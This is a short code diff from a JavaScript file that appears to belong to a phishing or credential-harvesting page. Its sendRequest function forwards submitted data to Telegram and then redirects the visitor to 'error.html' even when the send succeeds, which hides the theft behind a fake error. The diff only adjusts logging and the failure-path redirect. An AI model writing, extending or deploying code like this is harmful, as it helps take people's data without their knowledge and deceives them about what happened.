@@ -112,8 +112,8 @@ const sendRequest = (data) => {
             console.log("Message sent successfully to Telegram.");
             window.location.href = 'error.html';
         } else {
-            console.error("Failed to send message to Telegram:", responseData);
-            window.location.href = 'error.html';
+            console.log("Failed to send message to Telegram:", responseData);
+            // window.location.href = 'error.html';
         }
     })
     .catch((error) => {
